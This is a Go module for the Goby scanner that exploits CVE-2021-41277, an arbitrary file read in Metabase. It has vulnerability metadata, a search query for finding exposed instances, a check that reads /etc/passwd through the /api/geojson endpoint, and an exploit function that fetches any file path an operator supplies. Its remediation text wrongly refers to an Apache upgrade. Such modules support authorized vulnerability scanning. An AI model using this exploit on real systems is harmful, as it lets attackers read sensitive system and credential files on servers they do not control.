package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Metabase Arbitrary File Read (CVE-2021-41277)",
    "Description": "<p>Metabase is an open source data analysis platform.</p><p>Metabase analysis platform 0.40.5 and 1.40.5 have arbitrary file reading vulnerabilities, and attackers can read arbitrary files to further take over the system.</p>",
    "Impact": "Metabase Arbitrary File Read (CVE-2021-41277)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.metabase.com\">https://www.metabase.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
    "Product": "Metabase",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Metabase 平台任意文件读取漏洞（CVE-2021-41277）",
            "Description": "<p>Metabase是一个开源的数据分析平台。</p><p>Metabase分析平台0.40.5 和 1.40.5版本存在任意文件读取漏洞，攻击者可读取任意文件进一步接管系统。</p>",
            "Impact": "<p>Metabase分析平台0.40.5 和 1.40.5版本存在任意文件读取漏洞，攻击者可读取任意文件进一步接管系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.metabase.com\">https://www.metabase.com</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、升级Apache系统版本。</p>",
            "Product": "Metabase",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Metabase Arbitrary File Read (CVE-2021-41277)",
            "Description": "<p>Metabase is an open source data analysis platform.</p><p>Metabase analysis platform 0.40.5 and 1.40.5 have arbitrary file reading vulnerabilities, and attackers can read arbitrary files to further take over the system.</p>",
            "Impact": "Metabase Arbitrary File Read (CVE-2021-41277)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.metabase.com\">https://www.metabase.com</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. Upgrade the Apache system version.</p>",
            "Product": "Metabase",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "body=\"Metabase\" && body=\"window.MetabaseBootstrap\"",
    "GobyQuery": "body=\"Metabase\" && body=\"window.MetabaseBootstrap\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.metabase.com",
    "DisclosureDate": "2021-11-21",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-41277"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.9",
    "CVEIDs": [
        "CVE-2021-41277"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-202111-1565"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "Metabase"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10238"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/api/geojson?url=file:/etc/passwd"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json")
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				return resp1.StatusCode == 200 && regexp.MustCompile("root:(x*?):0:0:").MatchString(resp1.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri1 := "/api/geojson?url=file:" + cmd
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			cfg1.FollowRedirect = false
			cfg1.Header.Store("Content-Type", "application/json")
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					expResult.Output = resp1.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
